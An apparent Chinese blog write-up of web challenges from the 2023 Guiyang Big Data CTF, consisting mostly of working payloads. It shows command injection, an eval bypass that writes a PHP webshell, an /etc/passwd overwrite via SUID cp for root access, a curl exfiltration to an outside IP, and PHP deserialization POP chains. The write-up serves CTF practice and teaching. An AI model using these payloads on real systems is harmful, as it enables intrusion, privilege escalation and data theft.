@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="摸一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 贵阳大数据 CTF 部分题解">
+<meta property="og:url" content="https://southsea.st/2023-GYBD/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="摸一下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-28T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.071Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2023-GYBD/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2023-GYBD/","path":"2023-GYBD/","title":"2023 贵阳大数据 CTF 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023 贵阳大数据 CTF 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%94%E7%BB%86ping"><span class="nav-number">1.</span> <span class="nav-text">仔细ping</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#may_be"><span class="nav-number">2.</span> <span class="nav-text">May_be</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#notrce"><span class="nav-number">3.</span> <span class="nav-text">notrce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-number">4.</span> <span class="nav-text">pop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hackerconfused"><span class="nav-number">5.</span> <span class="nav-text">Hackerconfused</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E7%BE%8E%E7%BD%91%E7%AB%99"><span class="nav-number">6.</span> <span class="nav-text">完美网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%A4%AA%E5%96%9C%E6%AC%A2flask%E7%9A%84%E5%BC%80%E5%8F%91"><span class="nav-number">7.</span> <span class="nav-text">不太喜欢flask的开发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#just_proto"><span class="nav-number">8.</span> <span class="nav-text">JUST_PROTO</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2023-GYBD/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023 贵阳大数据 CTF 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023 贵阳大数据 CTF 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-04-28 00:00:00" itemprop="dateCreated datePublished" datetime="2023-04-28T00:00:00+00:00">2023-04-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>摸一下。</p>
+<span id="more"></span>
+<h3 id="仔细ping">仔细ping</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=nl%20flag.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Ping吗!&lt;/title&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/br&gt;&lt;pre&gt;     1	&lt;?php</span><br><span class="line">       </span><br><span class="line">     2	$flag = &quot;flag&#123;CAmbVbbBafY6k3tRybmqvqvWJYg8ms7s&#125;&quot;;</span><br><span class="line">     3	?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="may_be">May_be</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $a))  &#123;</span><br><span class="line">    if (!preg_match(&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;,$a))&#123;</span><br><span class="line">        eval($a);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;May be you should bypass.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;nonono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.68.43:35894/?a=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">1=system(&#x27;ls /&#x27;);</span><br><span class="line">bin boot dev etc home lib lib64 media mnt opt proc pushflag.sh root run sbin srv start.sh sys tmp usr var</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#flag单独写在某个文件中 #!/bin/bash echo $1 &gt; /.ffffffIIIIIII44444444444gggg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 151168 Sep 24  2020 /bin/cp</span><br><span class="line">-rwsr-xr-x 1 root root 55528 Jan 20  2022 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 71912 Jan 20  2022 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 35040 Jan 20  2022 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;echo &quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs=&quot; | base64 -d &gt; 1.php&#x27;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root2::0:0::/root:/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ cp /tmp/passwd /etc/passwd</span><br><span class="line">(www-data:/tmp) $ su root2 -c &quot;/.ffffffIIIIIII44444444444gggg&quot;</span><br><span class="line">/.ffffffIIIIIII44444444444gggg: line 1: flag&#123;mhbFHhwweJj4QuhveSQTsYXUCscvMbNd&#125;: command not found</span><br></pre></td></tr></table></figure>
+<h3 id="notrce">notrce</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l&#x27;&#x27;s | cu&#x27;&#x27;rl -d @- -X POST http://175.178.111.34:7777</span><br></pre></td></tr></table></figure>
+<h3 id="pop">pop</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class TT&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;welcome&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JJ&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        ($this -&gt; obj)();</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function evil($c)&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MM&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $c;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        ($this-&gt;name)($this-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;ok,but wrong&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($a, $b)&#123;</span><br><span class="line">        echo &quot;Hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($_GET[&#x27;bbb&#x27;]);</span><br><span class="line">throw new Error(&quot;NoNoNo&quot;);</span><br><span class="line"></span><br><span class="line">Fatal error: Uncaught Error: NoNoNo in /var/www/html/index.php:43 Stack trace: #0 &#123;main&#125; thrown in /var/www/html/index.php on line 43</span><br></pre></td></tr></table></figure>
+<p>在MM类的<code>__invoke</code>函数getshell，需要把MM当函数处理，在JJ的<code>__toString</code>把<code>$this -&gt; obj</code>当函数处理了，在TT的<code>__destruct</code>把<code>$this-&gt;key</code>当字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class TT&#123;</span><br><span class="line">    public $key;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class JJ&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class MM&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = new MM();</span><br><span class="line">$c-&gt;name = &quot;system&quot;;</span><br><span class="line">$c-&gt;c = &quot;cat /flag&quot;;</span><br><span class="line"></span><br><span class="line">$b = new JJ();</span><br><span class="line">$b -&gt; obj = $c;</span><br><span class="line"></span><br><span class="line">$a = new TT();</span><br><span class="line">$a-&gt;key = $b;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo serialize($arr);</span><br></pre></td></tr></table></figure>
+<p>throw new Error("NoNoNo");</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.56.174.142:52862/?bbb=O:2:%22TT%22:2:&#123;s:3:%22key%22;O:2:%22JJ%22:1:&#123;s:3:%22obj%22;O:2:%22MM%22:2:&#123;s:4:%22name%22;s:6:%22system%22;s:1:%22c%22;s:9:%22cat%20/flag%22;&#125;&#125;s:1:%22c%22;N;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ftJmMSTRfrtuYvNrXyndyMT9vnX4hGhr&#125; 1</span><br></pre></td></tr></table></figure>
+<h3 id="hackerconfused">Hackerconfused</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$CanRead = false;</span><br><span class="line">class SFile&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $num = count(scandir($this-&gt;name));</span><br><span class="line">        if($num &gt; 0)&#123;</span><br><span class="line">            return &#x27;Not null&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#x27;Access the backdoor_******.php.* in [0-f]&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name)&#123;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)===false)&#123;</span><br><span class="line">            $this-&gt;name = $name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;name = &#x27;nohint.txt&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)!==false)&#123;</span><br><span class="line">            die(&#x27;try again&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if($CanRead)&#123;</span><br><span class="line">            echo(file_get_contents($this-&gt;name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret = &#x27;nohint.txt&#x27;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        $CanRead = true;</span><br><span class="line">        return (new Funny($this-&gt;secret))-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;p&#x27;]))&#123;</span><br><span class="line">    unserialize(base64_decode($_GET[&#x27;p&#x27;]));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class SFile&#123;</span><br><span class="line">    public $name ;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret;</span><br><span class="line">&#125;</span><br><span class="line">$path = $_GET[&quot;path&quot;];</span><br><span class="line">$fun = new Fun();</span><br><span class="line">$fun-&gt;secret = new SFile($path);</span><br><span class="line">echo urlencode(base64_encode(serialize($fun)));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">path = &quot;glob://./backdoor_&quot;</span><br><span class="line">get_payload_url = &quot;http://127.0.0.1:7777/2023/gz/no.php&quot;</span><br><span class="line">exp_url = &quot;http://47.93.30.67:38017/&quot;</span><br><span class="line">dic = &quot;1234567890abcdef.ph&quot;</span><br><span class="line"></span><br><span class="line">flag = True</span><br><span class="line">while flag:</span><br><span class="line">    flag = False</span><br><span class="line">    for i in dic:</span><br><span class="line">        r = requests.get(url=get_payload_url, params=&#123;&quot;path&quot;: path + i + &quot;*&quot;&#125;)</span><br><span class="line">        p = r.text</span><br><span class="line">        r = requests.get(url=exp_url, params=&#123;&quot;p&quot;: p&#125;)</span><br><span class="line">        if r.text == &quot;Not null&quot;:</span><br><span class="line">            path = path + i</span><br><span class="line">            flag = True</span><br><span class="line">            print(path)</span><br><span class="line">            break</span><br><span class="line"># glob://./backdoor_a5f9d3.php</span><br></pre></td></tr></table></figure>
